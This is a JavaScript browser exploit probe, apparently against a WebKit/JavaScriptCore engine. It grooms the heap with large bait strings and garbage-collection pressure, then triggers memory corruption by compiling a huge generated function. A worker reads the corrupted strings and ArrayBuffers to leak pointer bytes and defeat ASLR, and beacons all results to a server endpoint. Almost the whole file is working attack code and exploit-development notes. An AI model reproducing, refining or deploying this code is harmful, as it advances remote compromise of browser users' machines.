// p479 — ASLR extraction probe
//
// V478 confirmed: compilation alone corrupts 14/14 strings (.length=81700), no call needed.
// Views: 0/700 byteOffset hits (48B cells in wrong MarkedSpace region).
//
// This probe adds TWO new extraction vectors:
// 1. charCodeAt deep scan: read 64 charCodes from each corrupted string to map the
//    entry fields visible through the corruption (thunk at entry+24 = 8 bytes of ASLR)
// 2. ArrayBuffer targets: 10 × 100,112B ABs in worker. If AB backing store is in the
//    sweep path, Uint8Array reads show entry data including the thunk.
//
// Also tests: is .length=81700 stable across reloads? (same value = not ASLR dependent)
//
// Beacon prefix: V479-
(function() {
  var BASE = location.protocol + '//' + location.host;
  var T0 = Date.now();
  function B(tag, body) {
    try {
      var dt = Date.now() - T0;
      var x = new XMLHttpRequest();
      x.open('POST', BASE + '/beacon/V479-' + tag, false);
      x.setRequestHeader('Content-Type', 'text/plain');
      x.send('[' + dt + 'ms] ' + (body || ''));
    } catch(e) {}
  }

  B('BOOT', navigator.userAgent);

  var workerCode = function() {
    var strings = [];
    var abTargets = [];
    var abViews = [];
    var baseUrl = '';
    var STR_LEN = 100000;
    var AB_SIZE = 100112;

    var wT0 = Date.now();
    function beacon(tag, body) {
      try {
        var dt = Date.now() - wT0;
        var x = new XMLHttpRequest();
        x.open('POST', baseUrl + '/beacon/V479-W-' + tag, false);
        x.setRequestHeader('Content-Type', 'text/plain');
        x.send('[' + dt + 'ms] ' + (body || ''));
      } catch(e) {}
    }

    self.onmessage = function(e) {
      if (e.data.cmd === 'init') {
        baseUrl = e.data.baseUrl;
        beacon('ALIVE');
        return;
      }
      if (e.data.cmd === 'alloc') {
        // 14 target strings (exact p466c pattern)
        for (var i = 0; i < 14; i++) {
          var s = '';
          for (var j = 0; j < STR_LEN; j += 1000) {
            s += 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA';
          }
          s = s.substring(0, STR_LEN);
          s.charCodeAt(0); // force rope resolution
          strings.push(s);
        }
        // 10 ArrayBuffer targets (100,112 bytes each — same marge tier as metadata)
        for (var i = 0; i < 10; i++) {
          var ab = new ArrayBuffer(AB_SIZE);
          abTargets.push(ab);
          abViews.push(new Uint8Array(ab));
        }
        beacon('ALLOC-s' + strings.length + '-ab' + abTargets.length);
        self.postMessage({ ready: true });
        return;
      }
      if (e.data.cmd === 'scan') {
        var phase = e.data.phase;

        // --- STRING SCAN ---
        var strHits = 0, strLens = [];
        for (var i = 0; i < strings.length; i++) {
          try {
            var len = strings[i].length;
            if (len !== STR_LEN) {
              strHits++;
              strLens.push(i + ':' + len);
            }
          } catch(ex) {
            strHits++;
            strLens.push(i + ':ERR');
          }
        }

        // --- charCodeAt DEEP SCAN on first 3 corrupted strings ---
        var charData = [];
        for (var si = 0; si < Math.min(3, strings.length); si++) {
          var codes = [];
          try {
            var sLen = strings[si].length;
            if (sLen === STR_LEN) continue; // skip uncorrupted
            // Read first 64 chars (covers entry+0..63 relative to StringImpl data)
            var readLen = Math.min(64, sLen);
            for (var ci = 0; ci < readLen; ci++) {
              try {
                codes.push(strings[si].charCodeAt(ci));
              } catch(ex2) { codes.push(-1); break; }
            }
            // Hex-encode the charCodes for beacon
            var hex = '';
            for (var h = 0; h < codes.length; h++) {
              var v = codes[h];
              if (v < 0) { hex += 'XX'; continue; }
              hex += (v < 16 ? '0' : '') + v.toString(16);
              if (h < codes.length - 1) hex += ',';
            }
            charData.push('s' + si + ':' + hex);
          } catch(ex3) {
            charData.push('s' + si + ':CRASH');
          }
        }

        // Also try reading at stride offsets (every 112 chars) to check periodicity
        var strideData = [];
        try {
          var s0 = strings[0];
          var s0len = s0.length;
          if (s0len !== STR_LEN && s0len > 336) {
            // Read charCodeAt at 0, 112, 224, 336 — should show 112B entry periodicity
            for (var off = 0; off < 448 && off < s0len; off += 112) {
              var c = s0.charCodeAt(off);
              strideData.push(off + ':' + c.toString(16));
            }
          }
        } catch(ex4) {}

        // --- ARRAYBUFFER SCAN ---
        var abHits = 0, abNonZeroOffsets = [];
        for (var ai = 0; ai < abViews.length; ai++) {
          var view = abViews[ai];
          var foundNonZero = false;
          // Scan first 1000 bytes for non-zero (sweep entry data)
          for (var bi = 0; bi < Math.min(1000, view.length); bi++) {
            if (view[bi] !== 0) {
              if (!foundNonZero) {
                abHits++;
                foundNonZero = true;
              }
              if (abNonZeroOffsets.length < 20) {
                abNonZeroOffsets.push('ab' + ai + '@' + bi + '=' + view[bi].toString(16));
              }
            }
          }
          if (foundNonZero) {
            // Read 8 bytes at stride offsets +24 (where thunk should be)
            var thunkBytes = [];
            for (var t = 24; t < Math.min(view.length, 560); t += 112) {
              var chunk = '';
              for (var tb = 0; tb < 8 && (t + tb) < view.length; tb++) {
                var bv = view[t + tb];
                chunk += (bv < 16 ? '0' : '') + bv.toString(16);
              }
              thunkBytes.push(t + ':' + chunk);
            }
            if (thunkBytes.length > 0) {
              beacon(phase + '-AB' + ai + '-THUNK', thunkBytes.join('|'));
            }
          }
        }

        // Also do a full 112-byte dump of first AB if it has non-zero data
        if (abHits > 0) {
          for (var ai2 = 0; ai2 < abViews.length; ai2++) {
            if (abViews[ai2][0] !== 0 || abViews[ai2][24] !== 0 || abViews[ai2][68] !== 0) {
              // Dump first 112 bytes as hex
              var dump = '';
              for (var d = 0; d < 112; d++) {
                var dv = abViews[ai2][d];
                dump += (dv < 16 ? '0' : '') + dv.toString(16);
              }
              beacon(phase + '-AB' + ai2 + '-DUMP112', dump);
              break; // just first hit
            }
          }
        }

        self.postMessage({
          type: 'scan-result', phase: phase,
          strHits: strHits, strLens: strLens,
          charData: charData, strideData: strideData,
          abHits: abHits, abNonZeroOffsets: abNonZeroOffsets
        });
        return;
      }
    };
  };

  var workerBlob = new Blob(
    ['(' + workerCode.toString() + ')()'],
    { type: 'application/javascript' }
  );
  var worker = new Worker(URL.createObjectURL(workerBlob));
  worker.postMessage({ cmd: 'init', baseUrl: BASE });

  worker.onmessage = function(e) {
    if (e.data.ready) {
      B('WORKER-READY');
      phaseFreeBaits();
    } else if (e.data.type === 'scan-result') {
      reportResults(e.data);
    }
  };

  // Phase 1: Bait strings (exact p466c)
  var N_BAIT = 20;
  var STR_LEN = 100000;
  var baits = [];
  for (var i = 0; i < N_BAIT; i++) {
    var bait = '';
    for (var j = 0; j < STR_LEN; j += 1000) {
      bait += 'BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB';
    }
    bait = bait.substring(0, STR_LEN);
    bait.charCodeAt(0);
    baits.push(bait);
  }
  B('BAITS-' + N_BAIT);
  worker.postMessage({ cmd: 'alloc' });

  // Phase 2: Free baits + heavy GC (exact p466c)
  function phaseFreeBaits() {
    for (var i = 0; i < baits.length; i++) baits[i] = null;
    baits = null;
    B('FREED');
    var gcRound = 0;
    function gcPressureRound() {
      for (var j = 0; j < 1000; j++) new ArrayBuffer(8192);
      for (var j = 0; j < 500; j++) new Array(100).fill(gcRound);
      gcRound++;
      if (gcRound < 30) {
        setTimeout(gcPressureRound, 30);
      } else {
        B('GC-' + gcRound);
        phaseBuild();
      }
    }
    gcPressureRound();
  }

  // Phase 3: Compile only (no function call — V478 proved this works)
  function phaseBuild() {
    var N = 38348816;
    var CHUNK = 4000000;
    var nC = Math.floor(N / CHUNK);
    var rem = N - nC * CHUNK;
    var callChunk = '';
    for (var c = 0; c < CHUNK; c++) callChunk += 'a();';
    var remChunk = '';
    for (var r = 0; r < rem; r++) remChunk += 'a();';
    var parts = ['window.__p479fn=function(a){'];
    for (var ch = 0; ch < nC; ch++) parts.push(callChunk);
    parts.push(remChunk);
    parts.push('};window.__p479ok=true;');
    var blob = new Blob(parts, { type: 'application/javascript' });
    B('BLOB-' + (blob.size / 1048576 | 0) + 'MB');
    callChunk = null; remChunk = null; parts = null;

    var sc = document.createElement('script');
    sc.onerror = function() { B('SCRIPT-ERR'); };
    sc.onload = function() {
      B('COMPILED-' + (window.__p479ok ? 'OK' : 'FAIL'));
      // Scan immediately — no function call
      worker.postMessage({ cmd: 'scan', phase: 'post-compile' });
    };
    document.head.appendChild(sc);
    sc.src = URL.createObjectURL(blob);
  }

  function reportResults(r) {
    var p = r.phase;
    B(p + '-STR', r.strHits + '-of-14');
    if (r.strLens.length > 0) {
      // Send lens in chunks (beacon body size limit)
      var allLens = r.strLens.join('|');
      if (allLens.length > 200) allLens = allLens.substring(0, 200);
      B(p + '-LENS', allLens);
    }

    // charCodeAt data — this is the key ASLR extraction data
    for (var i = 0; i < r.charData.length; i++) {
      var cd = r.charData[i];
      // Split into 200-char chunks for beacon
      for (var off = 0; off < cd.length; off += 200) {
        B(p + '-CHAR-' + i + (off > 0 ? '-P' + off : ''), cd.substring(off, off + 200));
      }
    }

    // Stride data (112-byte periodicity check)
    if (r.strideData.length > 0) {
      B(p + '-STRIDE', r.strideData.join('|'));
    }

    // AB data
    B(p + '-AB', 'hits=' + r.abHits);
    if (r.abNonZeroOffsets.length > 0) {
      B(p + '-ABNZ', r.abNonZeroOffsets.join('|'));
    }

    // Summary
    B('SUMMARY', 'str=' + r.strHits + ',ab=' + r.abHits);
    B('DONE');
  }
})();
